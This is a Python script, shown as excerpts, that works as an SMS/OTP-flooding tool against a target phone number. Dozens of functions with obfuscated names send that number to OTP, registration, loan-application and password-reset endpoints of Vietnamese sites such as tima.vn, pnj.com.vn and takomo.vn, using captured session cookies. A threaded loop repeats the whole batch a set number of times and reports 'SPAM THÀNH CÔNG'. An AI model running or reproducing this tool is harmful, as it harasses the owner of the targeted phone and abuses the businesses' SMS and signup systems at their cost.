        'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=1hDuKB6LPnlgEOgn; private_content_version=e43cc8178a6a71fece0c6db77f4b56d1; PHPSESSID=piouum2lgnbb1usi60h4v29ap9; section_data_ids=%7B%22customer%22%3A1722519971%7D',
        'dnt': '1',
        'newrelic':
        'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
        ...
        'sec-fetch-site': 'same-origin',
        'traceparent':
        '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
        'tracestate':
        '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
        'user-agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    ...
    response = requests.post('https://routine.vn/customer/otp/send/',
                             headers=headers,
                             data=data)
...
def WWXWWXWXWWWXXWXXXWXW(sdt):
    ...
    response_1 = requests.post('https://api.vayvnd.vn/v2/users',
                               headers=headers,
                               json=json_data_1)
    ...
    response_2 = requests.post('https://api.vayvnd.vn/v2/users/password-reset',
                               headers=headers,
                               json=json_data_2)
...
def jjliliijiijijllijlll(sdt):
    ...
    cookies = {
        ...
        'UrlSourceTima_V3':
        '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
    ...
    headers = {
        ...
        'cookie':
        'ASP.NET_SessionId=m1ooydpmdnksdwkm4lkadk4p; UrlSourceTima_V3={"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}; tkld=b460087b-2c70-9d44-da8d-68d0d4c00f3a; tbllender=tbllender',
        'dnt':
        '1',
        'origin':
        'https://tima.vn',
    ...
    response = requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast',
                             cookies=cookies,
                             headers=headers,
                             data=data)
...
def nmnmnnmmmmnmmnnnnnnmnnmn(sdt):
    ...
    headers = {
        ...
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie':
        '__RequestVerificationToken=zxA6lyDZVpywvn1LHgcIKm8LsCzx_R3icFZ2RYQXQXLaAcj2czJgJgcQ7glylX9PYWiS-ArycPkTIJSGcECxHdPiG3eyEiqG-dBqAkWMNPs1; ASP.NET_SessionId=y02wiifji0nhkleae0aqatst',
        'DNT': '1',
    ...
    response = requests.post('https://merchant.paynetone.vn/User/GetOTP',
                             headers=headers,
                             data=data,
                             verify=False)
...
def nmnmnnmnmmnmmmmmnm(sdt):
    ...
    cookies = {
        'XSRF-TOKEN':
        '%3D',
        'laravel_session':
        '%3D',
    }
    ...
    response = requests.post('https://moneygo.vn/dang-ki-vay-nhanh',
                             cookies=cookies,
                             headers=headers,
                             data=data)
...
def lIllIlIIlllIllllIIIII(sdt):
    ...
    response_1 = requests.post('https://auth.pico.vn/user/api/auth/register',
                               headers=headers_1,
                               json=json_data_1)
...
def MNMNNNNNNNNMNMNMNNMMNM(sdt):
    ...
    cookies = {
        'CDPI_VISITOR_ID':
        '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN':
        'New',
        'CDPI_SESSION_ID':
        'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN':
        '%3D',
        'mypnj_session':
        '%3D',
    }
    ...
    headers = {
        ...
        'u=0, i',
        'referer':
        'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
    ...
    response = requests.post('https://www.pnj.com.vn/customer/otp/request',
                             cookies=cookies,
                             headers=headers,
                             data=data)
    print("OTP SEND : SPAM THÀNH CÔNG ")
...
def JLLLLILLJIILJLIILIIJIJLJ(sdt):
    cookies = {
        'connect.sid':
        's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
    }
    ...
    headers = {
        ...
        '1',
        'origin':
        'https://prod-tini-id.nkidworks.com',
        'priority':
        'u=0, i',
        'referer':
        'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&amp;requiredLogin=true&amp;redirectUrl=https://tiniworld.com',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
    ...
    response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen',
                             cookies=cookies,
                             headers=headers,
                             data=data)
...
def xwwwxwxwxxxxwwwxxxw(sdt):
    ...
    cookies = {
        '__sbref':
        'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
        '_cabinet_key':
        'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
    }
    ...
    headers_get = {
        ...
        '1',
        'if-none-match':
        '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
        'priority':
        'u=0, i',
        'referer':
        'https://takomo.vn/',
    ...
    headers_post = {
        ...
        'u=1, i',
        'referer':
        'https://lk.takomo.vn/?phone={sdt}&amp;amount=2000000&amp;term=7&amp;utm_source=pop_up&amp;utm_medium=organic&amp;utm_campaign=direct_takomo&amp;utm_content=mainpage_popup_login',
        'sec-ch-ua':
        '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile':
        '?0',
    ...
    response_get = requests.get('https://lk.takomo.vn/',
                                params=params,
                                cookies=cookies,
                                headers=headers_get)
    ...
    response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send',
                                  cookies=cookies,
...
def LJJJJLJIJLLJLJILJLIILLIIL(phone, i):
    functions = [
        XWXWWWXWWWXXXXXXWW,
        lIlIlllllllIllIlI,
        mmnmmmnmmmmmmmnmmnnmnnmm,
        OODOOooDoOOoOoOooDD,
        JIILIILJJILJJILJIILLJILI,
        S222SSSSSS222S2SS2SS22222S,
        lIIllIlllIIllIIlIllI,
        DOOOOoDDDOODDDDoDooO,
        llIllIIIIlIlIIlIlIlll,
        NMMNNNMMNMMMMNNNM,
        XWWWWXWXWXXXXXXWXXW,
        MNMNNNMNMNMNNNMMNNMN,
        OO00OoO0o0Oo0ooOOo0OOO0o,
        Oo0oO0ooooo0O000O0ooO,
        LJIJIILJJJLIJLJJILJ,
        IlIIIlIlllIlIIlIlIllI,
        IlIIlllIIlIIIIlIIllIll,
        ODoOODODDOOOOOODDoDDOO,
        XXWXWWWXXXXXXWXXXWXXX,
        OOoO0O0OO000Oo00OooO0O0o,
        xwxwxxxxwwxxwwxwxwxxwxx,
        JLJLLIJJLJLJIIIIJLLLJJJJL,
        oOOoDDDDoOoDoOoooO,
        lIlIIIIIIIIlIlIIlllI,
        XWWWWXWXXWXXXXXXWXW,
        O00oOoOo0O0Oo0OO00OO0,
        WWWWWWXWXWXWXXWWW,
        xxwxxxxxxxxwwwxwwwxxxxwx,
        IllIIlIIIlIIlIIlIlI,
        xxwwwxwwwwxwxwwxxx,
        LJJLIILLLILIJIJLLJL,
        WXWWWWXWXWXXWWXWWWXWXXXX,
        DOoODDDDOOoDooOODDODDDO,
        xwwwwxxxwxwwwxxwxxwxwwx,
        IIIIIIlIIIlIIIIlIllIIIlII,
        lljjjjliiiljijljli,
        liljliiiijijljljl,
        O0O0OOoOoO0oOoOOOOoo0oOOO0,
        NMNMMMMNMNMNMMNMNN,
        DOooOoOOOODoODoooDO,
        S22SSS2SSSS22222SSS22,
        IIIIllllIllIIIIllIIIllI,
        mmnmmmnmmmmmmmnmmnnmnnmm,
        IIllIllIlllIlllII,
        mmnnmnmnnmmmnnmnmmmmm,
        lIIlllIIIllIIIlIIIIIll,
        jijjlljjjijjiiijjiilii,
        WWWXXXWWXXXWWWXWWXWXWX,
        XXWWXWWWXXWXWXXXXXW,
        IJIILJILJLLLJJLLJLJILII,
        SS2S22SSSS2S2SS22SSS,
        mmnmnnmnnnmmmnmmmnmnnmm,
        MMNNNMMMMMNNNNNNMNNNMMM,
        MMNMMMMMMNNMNMMNNMMM,
        jljijilllljjlijjjll,
        WXXXXWXWWWXWWWXXWXWXXXXXX,
        MMNMMNMMMNNMNNNMNNN,
        WWXXWWXWWXXWWXWWWWW,
        IILLILJLLLJLIJIJJ,
        jijiijjijllijijji,
        WXWWXWXWWWWWXXWWXXWXW,
        jjljjljjilijijjiljljjiil,
        OOooDOOoOODOOOoDOoOo,
        ljlljjlljiiiljljjlij,
        SS22SSSS22222S2SS2S2S,
        WWXWWXWXWWWXXWXXXWXW,
        jjliliijiijijllijlll,
        nmnmnnmnmmnmmmmmnm,
        xwwwxwxwxxxxwwwxxxw,
        nmnmnnmmmmnmmnnnnnnmnnmn,
        lIllIlIIlllIllllIIIII,
        MNMNNNNNNNNMNMNMNNMMNM,
        JLLLLILLJIILJLIILIIJIJLJ,
    ]
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
            ...
            for future in concurrent.futures.as_completed(futures):
                try:
                    ...
                    pass  # chặn toàn bộ lỗi cho sạch output

    print(f"\033[46mTHÀNH CÔNG LẦN {i}\033[0m")

        # Delay 4s
    for j in range(4, 0, -1):
            print(f"\033[44mVui lòng chờ {j} giây...\033[0m", end="\r")
            time.sleep(1)
    print(" " * 40, end="\r")
...
if __name__ == "__main__":
        ...
        if len(sys.argv) != 3:
            print("❌ Dùng: python file.py <sdt> <so_lan>")
            sys.exit(1)
